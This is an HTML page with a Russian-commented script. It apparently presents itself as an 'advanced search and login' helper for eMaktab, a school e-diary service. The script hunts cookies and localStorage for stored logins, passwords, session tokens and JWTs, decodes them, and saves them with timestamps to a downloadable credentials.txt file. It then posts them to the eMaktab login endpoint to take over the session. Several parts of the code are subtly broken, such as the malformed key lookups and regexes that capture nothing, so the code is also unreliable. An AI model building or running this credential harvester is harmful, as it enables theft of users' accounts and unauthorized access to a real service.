<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Расширенный поиск и вход в eMaktab</title>
    <script>
        // Функция для получения куки по имени
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return null;
        }

        // Функция для установки куки
        function setCookie(name, value, days) {
            const expires = new Date();
            expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
            document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/;HttpOnly;Secure`; // Улучшена безопасность
        }

        // Функция для работы с Local Storage
        function getFromLocalStorage(key) {
            return localStorage.getItem(key);
        }

        // Функция для декодирования Base64
        function decodeBase64(str) {
            try {
                return atob(str); // Декодирование Base64 в браузере
            } catch (e) {
                return null;
            }
        }

        // Функция для декодирования HEX
        function decodeHex(str) {
            try {
                let decoded = "";
                for (let i = 0; i < str.length; i += 2) {
                    decoded += String.fromCharCode(parseInt(str.substr(i, 2), 16));
                }
                return decoded;
            } catch (e) {
                return null;
            }
        }

        // Функция для декодирования JSON Web Token (JWT)
        function decodeJWT(str) {
            try {
                const [header, payload, signature] = str.split('.');
                if (!header || !payload || !signature) return null;
                const decodedPayload = atob(payload);
                return JSON.parse(decodedPayload);
            } catch (e) {
                return null;
            }
        }

        // Функция для сохранения данных в текстовый файл (через Blob для скачивания)
        function saveToFile(content, filename = "credentials.txt") {
            const blob = new Blob([content], { type: "text/plain" });
            const a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = filename;
            a.click();
            URL.revokeObjectURL(a.href);
        }

        // Функция для добавления данных в существующий файл (с датой/временем)
        function appendToFile(content, filename = "credentials.txt") {
            // Читаем данные из файла через Blob (создаём новый файл, если его нет)
            let existingContent = localStorage.getItem('credentialsCache') || ''; // Временное кэширование в Local Storage
            const timestamp = new Date().toLocaleString();
            const newContent = existingContent + `\n[${timestamp}] ${content}`.trim();

            // Сохраняем обновлённый контент в Local Storage как кэш
            localStorage.setItem('credentialsCache', newContent);

            // Сохраняем файл для скачивания
            saveToFile(newContent, filename);
        }

        // Функция для автоматического поиска логина и пароля (расширенная)
        function findCredentials() {
            let login = null, password = null;

            // Проверка куки (расширенный список ключей)
            const cookieKeys = ['emaktab_login', 'user', 'login', 'username', 'session', 'auth', 'token', 'identity'];
            for (let key of cookieKeys) {
                login = getCookie(key) || login;
                password = getCookie(key.replace('_login', '_password') || getCookie('password') || getCookie('pass')) || password;
                if (login || password) break;
            }

            // Декодирование данных (Base64, HEX, JWT)
            if (login) {
                const decodedBase64 = decodeBase64(login);
                const decodedHex = decodeHex(login);
                const decodedJWT = decodeJWT(login);
                login = decodedBase64 || decodedHex || (decodedJWT && decodedJWT.user ? decodedJWT.user : login);
            }
            if (password) {
                const decodedBase64 = decodeBase64(password);
                const decodedHex = decodeHex(password);
                const decodedJWT = decodeJWT(password);
                password = decodedBase64 || decodedHex || (decodedJWT && decodedJWT.password ? decodedJWT.password : password);
            }

            // Проверка Local Storage (расширенный список ключей)
            if (!login || !password) {
                const storageKeys = ['emaktab_login', 'user', 'login', 'username', 'session', 'auth', 'token', 'identity'];
                for (let key of storageKeys) {
                    login = getFromLocalStorage(key) || login;
                    password = getFromLocalStorage(key.replace('_login', '_password') || getFromLocalStorage('password') || getFromLocalStorage('pass')) || password;
                    if (login || password) break;
                }

                if (login) {
                    const decodedBase64 = decodeBase64(login);
                    const decodedHex = decodeHex(login);
                    const decodedJWT = decodeJWT(login);
                    login = decodedBase64 || decodedHex || (decodedJWT && decodedJWT.user ? decodedJWT.user : login);
                }
                if (password) {
                    const decodedBase64 = decodeBase64(password);
                    const decodedHex = decodeHex(password);
                    const decodedJWT = decodeJWT(password);
                    password = decodedBase64 || decodedHex || (decodedJWT && decodedJWT.password ? decodedJWT.password : password);
                }
            }

            // Проверка сессии (куки или Local Storage)
            if (!login || !password) {
                const sessionCookie = getCookie('session') || getFromLocalStorage('session');
                if (sessionCookie) {
                    const decodedBase64 = decodeBase64(sessionCookie);
                    const decodedHex = decodeHex(sessionCookie);
                    const decodedJWT = decodeJWT(sessionCookie);
                    const sessionData = decodedBase64 || decodedHex || (decodedJWT ? JSON.stringify(decodedJWT) : sessionCookie);
                    if (sessionData.includes("login") || sessionData.includes("user")) {
                        login = sessionData.match(/login|user|username=([^&]+)/)?.[1] || "Не найден";
                    }
                    if (sessionData.includes("password") || sessionData.includes("pass")) {
                        password = sessionData.match(/password|pass=([^&]+)/)?.[1] || "Не найден";
                    }
                }
            }

            if (!login || !password || login === "Не найден" || password === "Не найден") {
                alert("Не удалось автоматически найти логин и пароль. Проверь куки, Local Storage, или уточни у администратора.");
                return null;
            }

            return { login, password };
        }

        // Функция для автоматического входа и сохранения
        async function handleSubmit() {
            // Находим логин и пароль
            const credentials = findCredentials();
            if (!credentials) return;

            const { login, password } = credentials;

            // Сохраняем данные в файл
            const credentialsText = `Логин: ${login}\nПароль: ${password}`;
            appendToFile(credentialsText);
            console.log("Данные добавлены в credentials.txt");

            // Пытаемся войти на сайт
            try {
                const response = await fetch('https://login.emaktab.uz/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        'login': login,
                        'password': password
                    }),
                    credentials: 'include' // Включаем куки для сохранения сессии
                });

                if (response.ok) {
                    // Перенаправляем в личный кабинет
                    window.location.href = 'https://emaktab.uz/userfeed';
                    console.log("Успешный вход в eMaktab!");
                } else {
                    alert("Вход не удался. Проверь данные или свяжитесь с администратором.");
                    console.log(await response.text());
                }
            } catch (error) {
                alert("Ошибка при входе: " + error.message);
            }
        }

        // Запускаем всё при нажатии на кнопку
        document.addEventListener("DOMContentLoaded", function() {
            const form = document.querySelector("form");
            form.addEventListener("submit", function(e) {
                e.preventDefault(); // Отменяем стандартную отправку формы
                handleSubmit();
            });
        });
    </script>
</head>
<body>
    <form action="https://login.emaktab.uz/" method="POST">
        <input type="submit" value="Отправить">
    </form>
</body>
</html>

